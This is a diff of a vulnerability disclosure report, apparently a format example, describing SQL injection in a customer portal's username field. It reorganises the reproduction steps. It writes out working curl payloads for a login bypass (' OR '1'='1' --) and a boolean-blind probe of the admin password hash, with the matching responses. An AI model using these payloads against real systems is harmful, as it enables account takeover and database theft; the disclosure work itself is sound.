@@ -12,54 +12,50 @@ category: Disclosure & Reporting Formats
 
 ### Summary
 
-The customer portal's login form concatenates the `username` field directly into the authentication query, and an unauthenticated visitor uses it to both bypass login and read arbitrary rows from the accounts table. I tried the password field first since that's the more obvious target, but it turned out parameterized; the username field was the one still built with string concatenation. A single payload logs in as whichever account the query happens to return first — on this instance, that's the portal administrator.
+An unauthenticated visitor to the customer portal's login form bypasses login and reads arbitrary rows from the accounts table. The login form concatenates the `username` field directly into the authentication query. A single payload logs in as whichever account the query returns first — on this instance, the portal administrator.
+
+**Exploit flow**
+1. An unauthenticated visitor with no account and no prior access submits a crafted `username` value instead of real credentials on the public login page.
+2. The concatenated query returns the first row it matches, which is the administrator account on this instance.
+3. That payload logs the visitor into the admin dashboard with no password.
+4. A boolean-blind payload on the same field proves the query is a general read primitive, not just an auth-check quirk.
+5. The visitor extracts arbitrary data from the accounts table one bit at a time through that oracle.
 
 ### Steps to Reproduce
 
-1. Send a normal login attempt as a control, to confirm the baseline failure message:
+1. [attacker] Send a normal login attempt as a control, to confirm the baseline failure message:
 ```
 curl -s -X POST https://portal.example.com/login \
   -d "username=nobody&password=wrong"
 ```
-2. Send the same request with a boolean payload in the username field instead of a real value:
+**Expect:** `"Invalid username or password."`
+2. [attacker] Send the same request with a boolean payload in the username field instead of a real value:
 ```
 curl -s -X POST https://portal.example.com/login \
   -d "username=' OR '1'='1' -- &password=anything"
 ```
-3. The response is a 302 redirect to `/dashboard` with a `Set-Cookie` for an authenticated session — no valid credentials were supplied.
-4. Confirm the query is a general read primitive, not just an auth-check quirk, with a boolean-blind probe on the same field:
+**Expect:** 302 redirect to `/dashboard` with a `Set-Cookie` for an authenticated session, no valid credentials supplied.
+3. [attacker] Confirm the query is a general read primitive, not just an auth-check quirk. Send a boolean-blind probe on the same field:
 ```
 curl -s -X POST https://portal.example.com/login \
   -d "username=' AND (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x"
 ```
+**Expect:** 302 (true branch) confirms the password hash length guess.
 
 ### Evidence
 
+**Session minted without credentials.** Step 2's response headers:
 ```
-$ curl -s -i -X POST https://portal.example.com/login -d "username=nobody&password=wrong" | head -3
-HTTP/1.1 200 OK
-...
-Invalid username or password.                                    <-- control: normal failure path
-
-$ curl -s -i -X POST https://portal.example.com/login \
-    -d "username=' OR '1'='1' -- &password=anything" | head -3
 HTTP/1.1 302 Found
 Location: /dashboard
-Set-Cookie: session=eyJhbGciOi...                                 <-- authenticated without credentials
-
-$ curl -s -i -X POST https://portal.example.com/login \
-    -d "username=' AND (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x" | head -3
-HTTP/1.1 302 Found
-Location: /dashboard                                              <-- true branch: length guess correct
+Set-Cookie: session=eyJhbGciOi...                                 <-- authenticated session, no valid password supplied
 ```
 
-### Attack Scenario
-
-An unauthenticated visitor to the portal's public login page — no account, no prior access — submits a crafted username field instead of real credentials. The query returns the administrator's row first, so the visitor lands in the admin dashboard with no password.
+**Root cause.** I tried the password field first, since that seemed the more obvious target — it turned out parameterized. The username field is the one still built by string concatenation.
 
 ### Impact
 
-Unauthenticated login as the portal administrator, and full database read through the same injection point — proved here by extracting the stored password hash length for the `admin` row via the boolean oracle. Because the query returns whatever row it matches first, this isn't scoped to one account: any username in the table is reachable the same way.
+Unauthenticated login as the portal administrator, and full database read through the same injection point. Because the query returns whatever row it matches first, this isn't scoped to one account: any username in the table is reachable the same way.
 
 ### Remediation
 
